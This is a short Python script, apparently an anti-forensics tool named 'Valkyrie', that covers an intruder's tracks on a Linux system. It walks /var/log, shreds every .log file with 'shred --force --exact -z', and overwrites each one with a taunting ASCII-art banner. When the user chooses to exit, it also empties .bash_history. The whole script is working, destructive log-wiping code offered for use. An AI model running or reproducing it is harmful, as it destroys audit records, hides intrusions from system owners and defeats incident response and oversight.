import os
from fnmatch import fnmatch

Banner="""

               |))    |))
 .             |  )) /   ))
 \\   ^ ^      |    /      ))
  \\(((  )))   |   /        ))
   / G    )))  |  /        ))
  |o  _)   ))) | /       )))
   --' |     ))`/      )))
    ___|              )))
   / __\             ))))`()))
  /\@   /             `(())))
  \/   /  /`_______/\   \  ))))
       | |          \ \  |  )))
       | |           | | |   )))
       |_@           |_|_@    ))
      /_/           /_/_/
Valkyrie
	Nothing to see here, go ahead.


"""
pattern = "*.log"

for path, subdirs, files in os.walk("/var/log"):

	for name in files:

		if fnmatch(name, pattern):
			print("File: " + name + " gets shred.\n")
			os.system("shred --force --exact -z {}".format(os.path.join(path, name)))
			f = open(os.path.join(path, name), 'w+')
			f.write(Banner)
			f.close()




valid = False
while valid == False:

	i = str(input("Do you wanna leave now? [Y]es, [N]o: "))


	if i == "Y":
		valid = True
		os.system("clear")
		os.system('>.bash_history')
		print(Banner)
		import sys
		sys.exit(0)

	elif i == "N":
		valid = True
		print("What do you want here?")
		valid = False

	else:
		print("False Input try again")
		valid = False
